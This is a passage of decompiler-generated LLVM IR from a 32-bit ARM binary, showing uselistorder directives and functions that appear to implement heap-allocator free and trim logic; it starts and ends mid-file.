  uselistorder i32 %v0_12d10, { 0, 2, 1 }
  uselistorder i32 %v0_12cec, { 1, 0 }
  uselistorder i32 %v1_12c3c, { 1, 0, 2 }
  uselistorder i32 %v0_12c54, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12c14, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12d94, { 1, 0 }
  uselistorder label %dec_label_pc_12d2c.dec_label_pc_12d2c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12d10, { 1, 0 }
  uselistorder label %dec_label_pc_12cdc, { 1, 0 }
  uselistorder label %dec_label_pc_12cd0, { 1, 0 }
  uselistorder label %dec_label_pc_12ccc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12c88, { 1, 0 }
}

define i32 @function_12da0() local_unnamed_addr {
dec_label_pc_12da0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12da0 = load i32, i32* @r4, align 4
  %v6_12da0 = load i32, i32* @r5, align 4
  %v9_12da0 = load i32, i32* @r6, align 4
  %v12_12da0 = load i32, i32* @r7, align 4
  %v18_12da0 = load i32, i32* @lr, align 4
  %v0_12da8 = load i32, i32* @r0, align 4
  store i32 %v0_12da8, i32* @r6, align 4
  %v2_12da8 = icmp eq i32 %v0_12da8, 0
  %v2_12dac = ptrtoint i32* %stack_var_-40 to i32
  store i32 126992, i32* @r7, align 4
  br i1 %v2_12da8, label %dec_label_pc_12fb4, label %dec_label_pc_12db8

dec_label_pc_12db8:                               ; preds = %dec_label_pc_12da0
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12dbc = load i32, i32* inttoptr (i32 127060 to i32*), align 4
  store i32 %v4_12dbc, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_12dbc, i32* %r2.global-to-local, align 4
  %v4_12dc8 = load i32, i32* inttoptr (i32 127028 to i32*), align 4
  store i32 %v4_12dc8, i32* %r1.global-to-local, align 4
  store i32 %v2_12dac, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_12dd4 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  store i32 %v4_12dd4, i32* %ip.global-to-local, align 4
  store i32 77280, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12dd4)
  %v0_12de0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12de0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12de8 = load i32, i32* @r7, align 4
  %v2_12de8 = add i32 %v0_12de8, 16
  %v3_12de8 = inttoptr i32 %v2_12de8 to i32*
  %v4_12de8 = load i32, i32* %v3_12de8, align 4
  store i32 %v4_12de8, i32* %ip.global-to-local, align 4
  store i32 77300, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12de8)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12df8 = load i32, i32* @r7, align 4
  %v2_12df8 = add i32 %v0_12df8, 32
  %v3_12df8 = inttoptr i32 %v2_12df8 to i32*
  %v4_12df8 = load i32, i32* %v3_12df8, align 4
  store i32 %v4_12df8, i32* @lr, align 4
  %v0_12dfc = load i32, i32* @r6, align 4
  %v1_12dfc = add i32 %v0_12dfc, -4
  %v2_12dfc = inttoptr i32 %v1_12dfc to i32*
  %v3_12dfc = load i32, i32* %v2_12dfc, align 4
  store i32 %v3_12dfc, i32* %r2.global-to-local, align 4
  %v1_12e00 = inttoptr i32 %v4_12df8 to i32*
  %v2_12e00 = load i32, i32* %v1_12e00, align 4
  store i32 %v2_12e00, i32* %r3.global-to-local, align 4
  %v1_12e04 = and i32 %v3_12dfc, -4
  store i32 %v1_12e04, i32* %ip.global-to-local, align 4
  %v1_12e08 = add i32 %v0_12dfc, -8
  store i32 %v1_12e08, i32* @r5, align 4
  store i32 %v1_12e08, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12e04, %v2_12e00
  br i1 %tmp, label %dec_label_pc_12e38, label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12db8
  %v1_12e18 = or i32 %v2_12e00, 3
  store i32 %v1_12e18, i32* %r3.global-to-local, align 4
  store i32 %v1_12e18, i32* %v1_12e00, align 4
  %v3_12e1c = load i32, i32* @lr, align 4
  %v4_12e1c = add i32 %v3_12e1c, -8
  store i32 %v4_12e1c, i32* %lr.global-to-local, align 4
  %v0_12e20 = load i32, i32* %ip.global-to-local, align 4
  %v3_12e20 = udiv i32 %v0_12e20, 8
  store i32 %v3_12e20, i32* %r1.global-to-local, align 4
  %v1_12e24 = add i32 %v3_12e1c, -4
  store i32 %v1_12e24, i32* %r2.global-to-local, align 4
  %v4_12e28 = mul nuw i32 %v3_12e20, 4
  %v5_12e28 = add i32 %v4_12e28, %v1_12e24
  %v6_12e28 = inttoptr i32 %v5_12e28 to i32*
  %v7_12e28 = load i32, i32* %v6_12e28, align 4
  store i32 %v7_12e28, i32* %r3.global-to-local, align 4
  %v1_12e2c = load i32, i32* @r5, align 4
  %v2_12e2c = add i32 %v1_12e2c, 8
  %v3_12e2c = inttoptr i32 %v2_12e2c to i32*
  store i32 %v7_12e28, i32* %v3_12e2c, align 4
  %v0_12e30 = load i32, i32* @r5, align 4
  %v1_12e30 = load i32, i32* %r2.global-to-local, align 4
  %v2_12e30 = load i32, i32* %r1.global-to-local, align 4
  %v5_12e30 = mul i32 %v2_12e30, 4
  %v6_12e30 = add i32 %v5_12e30, %v1_12e30
  %v7_12e30 = inttoptr i32 %v6_12e30 to i32*
  store i32 %v0_12e30, i32* %v7_12e30, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12db8
  %v1_12e38 = and i32 %v3_12dfc, 2
  %v2_12e38 = icmp eq i32 %v1_12e38, 0
  br i1 %v2_12e38, label %dec_label_pc_12e40, label %dec_label_pc_12f74

dec_label_pc_12e40:                               ; preds = %dec_label_pc_12e38
  %v1_12e40 = or i32 %v2_12e00, 1
  store i32 %v1_12e40, i32* %r3.global-to-local, align 4
  store i32 %v1_12e40, i32* %v1_12e00, align 4
  %v0_12e48 = load i32, i32* @r6, align 4
  %v1_12e48 = add i32 %v0_12e48, -4
  %v2_12e48 = inttoptr i32 %v1_12e48 to i32*
  %v3_12e48 = load i32, i32* %v2_12e48, align 4
  store i32 %v3_12e48, i32* %r3.global-to-local, align 4
  %v0_12e4c = load i32, i32* @r5, align 4
  %v1_12e4c = load i32, i32* %ip.global-to-local, align 4
  %v2_12e4c = add i32 %v1_12e4c, %v0_12e4c
  store i32 %v2_12e4c, i32* %lr.global-to-local, align 4
  %v1_12e50 = urem i32 %v3_12e48, 2
  %v2_12e50 = icmp eq i32 %v1_12e50, 0
  %v1_12e54 = add i32 %v2_12e4c, 4
  %v2_12e54 = inttoptr i32 %v1_12e54 to i32*
  %v3_12e54 = load i32, i32* %v2_12e54, align 4
  store i32 %v3_12e54, i32* %r8.global-to-local, align 4
  br i1 %v2_12e50, label %dec_label_pc_12e5c, label %dec_label_pc_12e90

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e40
  %v1_12e5c = add i32 %v0_12e48, -8
  %v2_12e5c = inttoptr i32 %v1_12e5c to i32*
  %v3_12e5c = load i32, i32* %v2_12e5c, align 4
  store i32 %v3_12e5c, i32* %r1.global-to-local, align 4
  %v2_12e60 = sub i32 %v0_12e4c, %v3_12e5c
  store i32 %v2_12e60, i32* %r3.global-to-local, align 4
  %v1_12e64 = add i32 %v2_12e60, 8
  %v2_12e64 = inttoptr i32 %v1_12e64 to i32*
  %v3_12e64 = load i32, i32* %v2_12e64, align 4
  store i32 %v3_12e64, i32* %r2.global-to-local, align 4
  %v1_12e68 = add i32 %v3_12e64, 12
  %v2_12e68 = inttoptr i32 %v1_12e68 to i32*
  %v3_12e68 = load i32, i32* %v2_12e68, align 4
  store i32 %v3_12e68, i32* %r4.global-to-local, align 4
  %v9_12e6c = icmp eq i32 %v3_12e68, %v2_12e60
  %v1_12e70 = add i32 %v2_12e60, 12
  %v2_12e70 = inttoptr i32 %v1_12e70 to i32*
  %v3_12e70 = load i32, i32* %v2_12e70, align 4
  store i32 %v3_12e70, i32* %r0.global-to-local, align 4
  br i1 %v9_12e6c, label %dec_label_pc_12e78, label %dec_label_pc_12edc

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12e5c
  %v1_12e78 = add i32 %v3_12e70, 8
  %v2_12e78 = inttoptr i32 %v1_12e78 to i32*
  %v3_12e78 = load i32, i32* %v2_12e78, align 4
  store i32 %v3_12e78, i32* %r3.global-to-local, align 4
  %v9_12e7c = icmp eq i32 %v3_12e78, %v2_12e60
  br i1 %v9_12e7c, label %dec_label_pc_12e84, label %dec_label_pc_12edc

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12e78
  store i32 %v3_12e64, i32* %v2_12e78, align 4
  %v0_12e88 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e88 = load i32, i32* %r2.global-to-local, align 4
  %v2_12e88 = add i32 %v1_12e88, 12
  %v3_12e88 = inttoptr i32 %v2_12e88 to i32*
  store i32 %v0_12e88, i32* %v3_12e88, align 4
  %v0_12e8c = load i32, i32* %ip.global-to-local, align 4
  %v1_12e8c = load i32, i32* %r1.global-to-local, align 4
  %v2_12e8c = add i32 %v1_12e8c, %v0_12e8c
  store i32 %v2_12e8c, i32* %ip.global-to-local, align 4
  %v0_12e9c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12ea0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12e90

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e40, %dec_label_pc_12e84
  %v0_12f1c = phi i32 [ %v1_12e4c, %dec_label_pc_12e40 ], [ %v2_12e8c, %dec_label_pc_12e84 ]
  %v0_12ea0 = phi i32 [ %v3_12e54, %dec_label_pc_12e40 ], [ %v0_12ea0.pre, %dec_label_pc_12e84 ]
  %v1_12eb4 = phi i32 [ %v2_12e4c, %dec_label_pc_12e40 ], [ %v0_12e9c.pre, %dec_label_pc_12e84 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12e94 = load i32, i32* @r7, align 4
  %v2_12e94 = add i32 %v0_12e94, 32
  %v3_12e94 = inttoptr i32 %v2_12e94 to i32*
  %v4_12e94 = load i32, i32* %v3_12e94, align 4
  store i32 %v4_12e94, i32* %r2.global-to-local, align 4
  %v1_12e98 = add i32 %v4_12e94, 44
  %v2_12e98 = inttoptr i32 %v1_12e98 to i32*
  %v3_12e98 = load i32, i32* %v2_12e98, align 4
  store i32 %v3_12e98, i32* %r3.global-to-local, align 4
  %v9_12e9c = icmp eq i32 %v1_12eb4, %v3_12e98
  %v1_12ea0 = and i32 %v0_12ea0, -4
  store i32 %v1_12ea0, i32* %r0.global-to-local, align 4
  br i1 %v9_12e9c, label %dec_label_pc_12f1c, label %dec_label_pc_12ea8

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12e90
  %v2_12ea8 = add i32 %v1_12eb4, %v1_12ea0
  store i32 %v2_12ea8, i32* %r3.global-to-local, align 4
  %v1_12eac = add i32 %v2_12ea8, 4
  %v2_12eac = inttoptr i32 %v1_12eac to i32*
  %v3_12eac = load i32, i32* %v2_12eac, align 4
  store i32 %v3_12eac, i32* %r3.global-to-local, align 4
  %v1_12eb0 = urem i32 %v3_12eac, 2
  %v2_12eb0 = icmp eq i32 %v1_12eb0, 0
  %v2_12eb4 = add i32 %v1_12eb4, 4
  %v3_12eb4 = inttoptr i32 %v2_12eb4 to i32*
  store i32 %v1_12ea0, i32* %v3_12eb4, align 4
  br i1 %v2_12eb0, label %dec_label_pc_12ebc, label %dec_label_pc_12ea8.dec_label_pc_12eec_crit_edge

dec_label_pc_12ea8.dec_label_pc_12eec_crit_edge:  ; preds = %dec_label_pc_12ea8
  %v0_12efc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12eec

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12ea8
  %v0_12ebc = load i32, i32* %lr.global-to-local, align 4
  %v1_12ebc = add i32 %v0_12ebc, 8
  %v2_12ebc = inttoptr i32 %v1_12ebc to i32*
  %v3_12ebc = load i32, i32* %v2_12ebc, align 4
  store i32 %v3_12ebc, i32* %r1.global-to-local, align 4
  %v1_12ec0 = add i32 %v3_12ebc, 12
  %v2_12ec0 = inttoptr i32 %v1_12ec0 to i32*
  %v3_12ec0 = load i32, i32* %v2_12ec0, align 4
  store i32 %v3_12ec0, i32* %r3.global-to-local, align 4
  %v9_12ec4 = icmp eq i32 %v3_12ec0, %v0_12ebc
  %v1_12ec8 = add i32 %v0_12ebc, 12
  %v2_12ec8 = inttoptr i32 %v1_12ec8 to i32*
  %v3_12ec8 = load i32, i32* %v2_12ec8, align 4
  store i32 %v3_12ec8, i32* %r2.global-to-local, align 4
  br i1 %v9_12ec4, label %dec_label_pc_12ed0, label %dec_label_pc_12edc

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12ebc
  %v1_12ed0 = add i32 %v3_12ec8, 8
  %v2_12ed0 = inttoptr i32 %v1_12ed0 to i32*
  %v3_12ed0 = load i32, i32* %v2_12ed0, align 4
  store i32 %v3_12ed0, i32* %r3.global-to-local, align 4
  %v9_12ed4 = icmp eq i32 %v3_12ed0, %v0_12ebc
  br i1 %v9_12ed4, label %dec_label_pc_12ee0, label %dec_label_pc_12edc

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12ebc, %dec_label_pc_12e78, %dec_label_pc_12e5c, %dec_label_pc_12ed0
  %v0_12edc = call i32 @function_1301c()
  store i32 %v0_12edc, i32* %r0.global-to-local, align 4
  %v0_12ee0.pre = load i32, i32* @r1, align 4
  %v1_12ee0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12ee0

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ed0, %dec_label_pc_12edc
  %v1_12ee0 = phi i32 [ %v3_12ec8, %dec_label_pc_12ed0 ], [ %v1_12ee0.pre, %dec_label_pc_12edc ]
  %v0_12ee0 = phi i32 [ %v3_12ebc, %dec_label_pc_12ed0 ], [ %v0_12ee0.pre, %dec_label_pc_12edc ]
  %v2_12ee0 = add i32 %v1_12ee0, 8
  %v3_12ee0 = inttoptr i32 %v2_12ee0 to i32*
  store i32 %v0_12ee0, i32* %v3_12ee0, align 4
  %v0_12ee4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ee4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ee4 = add i32 %v1_12ee4, 12
  %v3_12ee4 = inttoptr i32 %v2_12ee4 to i32*
  store i32 %v0_12ee4, i32* %v3_12ee4, align 4
  %v0_12ee8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ee8 = load i32, i32* %r0.global-to-local, align 4
  %v2_12ee8 = add i32 %v1_12ee8, %v0_12ee8
  store i32 %v2_12ee8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12eec

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12ea8.dec_label_pc_12eec_crit_edge, %dec_label_pc_12ee0
  %v0_12efc = phi i32 [ %v0_12efc.pre, %dec_label_pc_12ea8.dec_label_pc_12eec_crit_edge ], [ %v2_12ee8, %dec_label_pc_12ee0 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12ef0 = load i32, i32* @r7, align 4
  %v2_12ef0 = add i32 %v0_12ef0, 32
  %v3_12ef0 = inttoptr i32 %v2_12ef0 to i32*
  %v4_12ef0 = load i32, i32* %v3_12ef0, align 4
  %v1_12ef4 = add i32 %v4_12ef0, 52
  store i32 %v1_12ef4, i32* %r3.global-to-local, align 4
  %v1_12ef8 = add i32 %v4_12ef0, 60
  %v2_12ef8 = inttoptr i32 %v1_12ef8 to i32*
  %v3_12ef8 = load i32, i32* %v2_12ef8, align 4
  store i32 %v3_12ef8, i32* %r1.global-to-local, align 4
  %v1_12efc = or i32 %v0_12efc, 1
  store i32 %v1_12efc, i32* %r2.global-to-local, align 4
  %v1_12f00 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f00 = add i32 %v1_12f00, 12
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  store i32 %v1_12ef4, i32* %v3_12f00, align 4
  %v0_12f04 = load i32, i32* %r1.global-to-local, align 4
  %v1_12f04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 8
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  store i32 %v0_12f04, i32* %v3_12f04, align 4
  %v0_12f08 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f08 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f08 = add i32 %v1_12f08, 4
  %v3_12f08 = inttoptr i32 %v2_12f08 to i32*
  store i32 %v0_12f08, i32* %v3_12f08, align 4
  %v0_12f0c = load i32, i32* %ip.global-to-local, align 4
  %v1_12f0c = load i32, i32* %r4.global-to-local, align 4
  %v3_12f0c = add i32 %v1_12f0c, %v0_12f0c
  %v4_12f0c = inttoptr i32 %v3_12f0c to i32*
  store i32 %v0_12f0c, i32* %v4_12f0c, align 4
  %v0_12f10 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f10 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f10 = add i32 %v1_12f10, 12
  %v3_12f10 = inttoptr i32 %v2_12f10 to i32*
  store i32 %v0_12f10, i32* %v3_12f10, align 4
  %v0_12f14 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f14 = load i32, i32* %r3.global-to-local, align 4
  %v2_12f14 = add i32 %v1_12f14, 8
  %v3_12f14 = inttoptr i32 %v2_12f14 to i32*
  store i32 %v0_12f14, i32* %v3_12f14, align 4
  br label %dec_label_pc_12f2c

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12e90
  %v2_12f1c = add i32 %v1_12ea0, %v0_12f1c
  store i32 %v2_12f1c, i32* %ip.global-to-local, align 4
  %v1_12f20 = or i32 %v2_12f1c, 1
  store i32 %v1_12f20, i32* %r3.global-to-local, align 4
  %v0_12f24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12f24, i32* %v2_12e98, align 4
  %v0_12f28 = load i32, i32* %r3.global-to-local, align 4
  %v1_12f28 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f28 = add i32 %v1_12f28, 4
  %v3_12f28 = inttoptr i32 %v2_12f28 to i32*
  store i32 %v0_12f28, i32* %v3_12f28, align 4
  br label %dec_label_pc_12f2c

dec_label_pc_12f2c:                               ; preds = %dec_label_pc_12eec, %dec_label_pc_12f1c
  %v0_12f2c = load i32, i32* %ip.global-to-local, align 4
  %v3_12f30 = icmp ult i32 %v0_12f2c, 131070
  br i1 %v3_12f30, label %dec_label_pc_12f9c, label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f2c
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_12f38 = load i32, i32* @r7, align 4
  %v2_12f38 = add i32 %v0_12f38, 32
  %v3_12f38 = inttoptr i32 %v2_12f38 to i32*
  %v4_12f38 = load i32, i32* %v3_12f38, align 4
  store i32 %v4_12f38, i32* @r4, align 4
  %v1_12f3c = inttoptr i32 %v4_12f38 to i32*
  %v2_12f3c = load i32, i32* %v1_12f3c, align 4
  store i32 %v2_12f3c, i32* %r3.global-to-local, align 4
  %v1_12f40 = and i32 %v2_12f3c, 2
  %v2_12f40 = icmp eq i32 %v1_12f40, 0
  br i1 %v2_12f40, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_12f34
  store i32 %v4_12f38, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12f34, %bb
  store i32 77644, i32* @lr, align 4
  %v1_12f48 = xor i1 %v2_12f40, true
  call void @__pseudo_cond_branch(i1 %v1_12f48, i32 ptrtoint (i32* @global_var_12bec.390 to i32))
  %v0_12f4c = load i32, i32* @r4, align 4
  %v1_12f4c = add i32 %v0_12f4c, 44
  %v2_12f4c = inttoptr i32 %v1_12f4c to i32*
  %v3_12f4c = load i32, i32* %v2_12f4c, align 4
  store i32 %v3_12f4c, i32* %r3.global-to-local, align 4
  %v1_12f50 = add i32 %v3_12f4c, 4
  %v2_12f50 = inttoptr i32 %v1_12f50 to i32*
  %v3_12f50 = load i32, i32* %v2_12f50, align 4
  store i32 %v3_12f50, i32* %r3.global-to-local, align 4
  %v1_12f54 = add i32 %v0_12f4c, 836
  %v2_12f54 = inttoptr i32 %v1_12f54 to i32*
  %v3_12f54 = load i32, i32* %v2_12f54, align 4
  store i32 %v3_12f54, i32* %r2.global-to-local, align 4
  %v1_12f58 = and i32 %v3_12f50, -4
  store i32 %v1_12f58, i32* %r3.global-to-local, align 4
  %v3_12f5c = icmp ult i32 %v1_12f58, %v3_12f54
  br i1 %v3_12f5c, label %dec_label_pc_12f9c, label %dec_label_pc_12f64

dec_label_pc_12f64:                               ; preds = %bb15
  store i32 %v0_12f4c, i32* %r1.global-to-local, align 4
  %v1_12f68 = add i32 %v0_12f4c, 840
  %v2_12f68 = inttoptr i32 %v1_12f68 to i32*
  %v3_12f68 = load i32, i32* %v2_12f68, align 4
  store i32 %v3_12f68, i32* %r0.global-to-local, align 4
  %v2_12f6c = call i32 @function_12b3c(i32 %v3_12f68, i32 %v0_12f4c)
  store i32 %v2_12f6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12e38
  %v2_12f74 = inttoptr i32 %v1_12e08 to i32*
  %v3_12f74 = load i32, i32* %v2_12f74, align 4
  store i32 %v3_12f74, i32* %r0.global-to-local, align 4
  %v1_12f78 = add i32 %v4_12df8, 848
  %v2_12f78 = inttoptr i32 %v1_12f78 to i32*
  %v3_12f78 = load i32, i32* %v2_12f78, align 4
  store i32 %v3_12f78, i32* %r2.global-to-local, align 4
  %v1_12f7c = add i32 %v4_12df8, 868
  %v2_12f7c = inttoptr i32 %v1_12f7c to i32*
  %v3_12f7c = load i32, i32* %v2_12f7c, align 4
  %v2_12f80 = add i32 %v3_12f74, %v1_12e04
  store i32 %v2_12f80, i32* %r1.global-to-local, align 4
  %v1_12f84 = add i32 %v3_12f78, -1
  store i32 %v1_12f84, i32* %r2.global-to-local, align 4
  %v2_12f88 = sub i32 %v3_12f7c, %v2_12f80
  store i32 %v2_12f88, i32* %r3.global-to-local, align 4
  store i32 %v2_12f88, i32* %v2_12f7c, align 4
  %v1_12f90 = load i32, i32* @lr, align 4
  %v2_12f90 = add i32 %v1_12f90, 848
  %v3_12f90 = inttoptr i32 %v2_12f90 to i32*
  store i32 %v1_12f84, i32* %v3_12f90, align 4
  %v0_12f94 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f94 = load i32, i32* @r5, align 4
  %v2_12f94 = sub i32 %v1_12f94, %v0_12f94
  store i32 %v2_12f94, i32* %r0.global-to-local, align 4
  %v4_12f98 = call i32 @function_14584(i32 %v2_12f94, i32 %v2_12f80, i32 %v1_12f84, i32 %v2_12f88)
  store i32 %v4_12f98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %bb15, %dec_label_pc_12f2c, %dec_label_pc_12f64, %dec_label_pc_12e18, %dec_label_pc_12f74
  store i32 %v2_12dac, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_12fa8 = load i32, i32* @r7, align 4
  %v2_12fa8 = add i32 %v0_12fa8, 24
  %v3_12fa8 = inttoptr i32 %v2_12fa8 to i32*
  %v4_12fa8 = load i32, i32* %v3_12fa8, align 4
  store i32 %v4_12fa8, i32* @ip, align 4
  store i32 77748, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12fa8)
  br label %dec_label_pc_12fb4

dec_label_pc_12fb4:                               ; preds = %dec_label_pc_12da0, %dec_label_pc_12f9c
  store i32 %v3_12da0, i32* @r4, align 4
  store i32 %v6_12da0, i32* @r5, align 4
  store i32 %v9_12da0, i32* @r6, align 4
  store i32 %v12_12da0, i32* @r7, align 4
  store i32 %v18_12da0, i32* @lr, align 4
  ret i32 %v2_12dac

; uselistorder directives
  uselistorder i32 %v0_12f4c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12f0c, { 1, 0 }
  uselistorder i32 %v1_12e4c, { 1, 0 }
  uselistorder i32 %v0_12e4c, { 1, 0 }
  uselistorder i32 %v3_12e20, { 1, 0 }
  uselistorder i32 %v1_12e04, { 1, 0, 2 }
  uselistorder i32 %v2_12e00, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12df8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12da8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 5, 1, 2, 3, 4, 0, 6, 7, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_12fb4, { 1, 0 }
  uselistorder label %dec_label_pc_12f9c, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12f2c, { 1, 0 }
  uselistorder label %dec_label_pc_12eec, { 1, 0 }
  uselistorder label %dec_label_pc_12ee0, { 1, 0 }
  uselistorder label %dec_label_pc_12edc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12e90, { 1, 0 }
}

define i32 @function_12fc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_12fc4:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_12fc4 = load i1, i1* @cpsr_z, align 1
  %v2_12fc4 = load i32, i32* @r4, align 4
  br i1 %v0_12fc4, label %bb, label %dec_label_pc_12fc4..thread4_crit_edge

dec_label_pc_12fc4..thread4_crit_edge:            ; preds = %dec_label_pc_12fc4
  %v0_12ff0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_12fc4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12fc4..thread4_crit_edge, %bb
  %v0_12ff0 = phi i32 [ %v0_12ff0.pre, %dec_label_pc_12fc4..thread4_crit_edge ], [ 0, %bb ]
  store i32 %v2_12fc4, i32* %stack_var_-12, align 4
  %v6_12fdc = load i32, i32* @r5, align 4
  %v9_12fdc = load i32, i32* @lr, align 4
  %v4_12fec = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12fec, i32* @r5, align 4
  store i32 %v0_12ff0, i32* @r4, align 4
  store i32 %v4_12fec, i32* @r0, align 4
  %v0_12ffc = call i32 @function_12bec()
  %v0_13000 = load i32, i32* @r4, align 4
  store i32 %v0_13000, i32* %r0.global-to-local, align 4
  %v0_13004 = load i32, i32* @r5, align 4
  %v2_1300c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1300c, i32* @r4, align 4
  store i32 %v6_12fdc, i32* @r5, align 4
  store i32 %v9_12fdc, i32* @lr, align 4
  %v2_13010 = call i32 @function_12b3c(i32 %v0_13000, i32 %v0_13004)
  store i32 %v2_13010, i32* %r0.global-to-local, align 4
  %v0_13014 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13014, label %bb13, label %.thread5

bb13:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb13
  %v4_13018 = phi i32 [ %v2_13010, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_13018

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_12b3c, { 1, 0 }
  uselistorder i32 ()* @function_12bec, { 3, 2, 0, 1 }
  uselistorder i32* inttoptr (i32 127024 to i32*), { 17, 2, 1, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_1301c() local_unnamed_addr {
dec_label_pc_1301c:
